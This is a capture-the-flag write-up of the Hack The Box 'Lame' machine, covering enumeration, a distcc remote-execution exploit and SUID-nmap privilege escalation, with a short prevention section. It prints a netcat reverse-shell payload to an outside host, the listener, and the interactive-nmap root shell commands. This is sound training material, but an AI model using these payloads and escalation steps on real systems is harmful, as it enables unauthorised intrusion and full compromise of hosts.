---
layout: post
title: Hack The Box Walkthrough - Lame
date: 2022-04-18
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
permalink: /2022/04/HTB/Lame
img: 2022/04/Lame/Lame.png
---

This is a simple machine, but it has a few things installed on it. And I managed to fall into a few rabbit holes while doing it.

* Room: Lame
* Difficulty: Easy
* URL: [https://app.hackthebox.com/machines/Lame](https://app.hackthebox.com/machines/Lame)
* Author: [ch4p](https://app.hackthebox.com/users/1)


## Enumeration

I started the machine by checking open ports.

```bash
$ rustscan -a target.htb -- -A -Pn | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.130.136:21
Open 10.129.130.136:22
Open 10.129.130.136:139
Open 10.129.130.136:445
Open 10.129.130.136:3632
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-17 14:00 EDT

...

PORT     STATE SERVICE     REASON  VERSION
21/tcp   open  ftp         syn-ack vsftpd 2.3.4
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.50
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         syn-ack OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALz4hsc8a2Srq4nlW960qV8xwBG0JC+jI7fWxm5METIJH4tKr/xUTwsTYEYnaZLzcOiy21D3ZvOwYb6AA3765zdgCd2Tgand7F0YD5UtXG7b7fbz99chReivL0SIWEG/E96Ai+pqYMP2WD5KaOJwSIXSUajnU5oWmY5x85sBw+XDAAAAFQDFkMpmdFQTF+oRqaoSNVU7Z+hjS
wAAAIBCQxNKzi1TyP+QJIFa3M0oLqCVWI0We/ARtXrzpBOJ/dt0hTJXCeYisKqcdwdtyIn8OUCOyrIjqNuA2QW217oQ6wXpbFh+5AQm8Hl3b6C6o8lX3Ptw+Y4dp0lzfWHwZ/jzHwtuaDQaok7u1f971lEazeJLqfiWrAzoklqSWyDQJAAAAIA1lAD3xWYkeIeHv/R3P9i+XaoI7imFkMuYXCDTq843YU6Td+0mWpll
CqAWUV/CQamGgQLtYy5S0ueoks01MoKdOMMhKVwqdr08nvCBdNKjIEd3gH6oBk/YRnjzxlEAYBsvCmM4a0jmhz0oNiRWlc/F+bkUeFKrBx/D2fdfZmhrGg==
|   2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo
3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     syn-ack distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2022-04-17T14:00:47-04:00
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 33764/tcp): CLEAN (Timeout)
|   Check 2 (port 57327/tcp): CLEAN (Timeout)
|   Check 3 (port 36784/udp): CLEAN (Timeout)
|   Check 4 (port 43997/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 2h00m30s, deviation: 2h49m44s, median: 28s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:00
Completed NSE at 14:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:00
Completed NSE at 14:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:00
Completed NSE at 14:00, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.10 seconds
```

There was a few port opened on the machine.

* 21 - FTP
* 22 - SSH
* 139 - SMB
* 445 - SMB
* 3632 - distcc

## FTP

The FTP was allowing anonymous access, so that was the first thing I looked at.

```
$ ftp target
Connected to target.
220 (vsFTPd 2.3.4)
Name (target:ehogue): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls -la
229 Entering Extended Passive Mode (|||20887|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.

ftp> put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||41714|).
553 Could not create file.
```

There was nothing on the server. And I could not write to it.

## SMB

I moved to the SMB sever and tried to enumerate it.

```bash
$ enum4linux -a target | tee enum4linux.txt
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Apr 17 14:00:39 2022

 =========================================( Target Information )=========================================

Target ........... target
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

...

 ====================================( Share Enumeration on target )====================================


        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME

[+] Attempting to map shares on target

//target/print$ Mapping: DENIED Listing: N/A Writing: N/A
//target/tmp    Mapping: OK Listing: OK Writing: N/A
//target/opt    Mapping: DENIED Listing: N/A Writing: N/A
...
```

It looked like the tmp share was opened. I connected to it.

```bash
$ smbclient //target/tmp
Enter WORKGROUP\ehogue's password:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Apr 17 14:10:03 2022
  ..                                 DR        0  Sat Oct 31 02:33:58 2020
  .ICE-unix                          DH        0  Sun Apr 17 13:46:11 2022
  vmware-root                        DR        0  Sun Apr 17 13:47:19 2022
  .X11-unix                          DH        0  Sun Apr 17 13:46:36 2022
  .X0-lock                           HR       11  Sun Apr 17 13:46:36 2022
  vgauthsvclog.txt.0                  R     1600  Sun Apr 17 13:46:10 2022

                7282168 blocks of size 1024. 5385908 blocks available

smb: \> put test.txt
putting file test.txt as \test.txt (0.0 kb/s) (average 0.0 kb/s)
```

There was a few files, and I could write to it. But I didn't see anything I could exploit there.

## distcc

I did not know what distcc was. I looked it up, it's a distributed compiler for C/C++.

I checked for exploit, SearchSploit found one.

```bash
$ searchsploit distcc
-----------------------------------------------------------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
-----------------------------------------------------------------------------------
DistCC Daemon - Command Execution (Metasploit)    | multiple/remote/9915.rb
-----------------------------------------------------------------------------------
Shellcodes: No Results
```

I tried to avoid Metasploit when possible. It works well, but since it does all the work, there is not much to learn. I found a [Python script](https://github.com/galenlim/distcc-exploit-python) that is a port of the Metasploit exploit. It connects to the port, then send a reverse shell command disguised as compilation command. 

I downloaded the script. 

```bash
$ curl https://raw.githubusercontent.com/galenlim/distcc-exploit-python/master/distcc_exploit.py -o distcc_exploit.py
```

Fixed the payload on line 18, to go to my machine.

```python
payload = "nc 1.1.1.1 4444 -e /bin/bash"
```

Then I started a netcat listener and launched the script. 
```bash
$ python distcc_exploit.py target 3632
[*] Attempting exploit...
Check your reverse handler...
```

I got the connection on my listener. 

```bash
$ nc -klvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.130.136 41112

whoami
daemon
```

I looked in the home folders and found the user flag.

```bash
ls /home
ftp
makis
service
user

ls /home/makis
user.txt

cat /home/makis/user.txt
REDACTED
```

## Privilege Escalation

Getting root should have been very easy. The vulnerability was in one of the first thing I looked at usually. But for some reason I did not do it this time. 

I looked all over the server. But did not see anything of interest. I uploaded LinPEAS and ran it. It flagged a few things. 

There was a mysql server running with no password for the root user. I connected to the server and looked around. There was a few databases. I found an MD5 password hash that I reversed. But the password did not work anywhere. 

LinPEAS also saw the NFS configuration with [no_root_squash](https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe).


I kept looking at the LinPeas result and I finally saw what I should have looked at first. nmap had the suid bit set. 

I usually start by checking for this exact thing when I try to escalate my privileges.

```bash
daemon@lame:/home/makis$ find / -perm /u=s 2>/dev/null

...
/usr/bin/chfn
/usr/bin/nmap
/usr/bin/chsh
...

daemon@lame:/home/makis$ ls -l /usr/bin/nmap
ls -l /usr/bin/nmap
-rwsr-xr-x 1 root root 780676 Apr  8  2008 /usr/bin/nmap
```

This mean that when I run nmap, it runs with root privileges. If I can use it to run a command for me, it will be done as root. 

I went to [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/) and found that nmap has an interactive mode. I used it to launch bash as root.

```bash
daemon@lame:/home/makis$ nmap --interactive
nmap --interactive

Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h <enter> for help

nmap> !/bin/bash -p
!/bin/bash -p

bash-3.2# whoami
whoami
root

bash-3.2# cat /root/root.txt
cat /root/root.txt
REDACTED
```

## Prevention

To protect that box, distcc should probably not be exposed. If it really needs to run, the port should be available only to trusted machines. At least it ran as a low privilege user. 

The suid bit should never be added to an executable that does not require it. And especially not to a program like nmap that allows us to launch a shell. 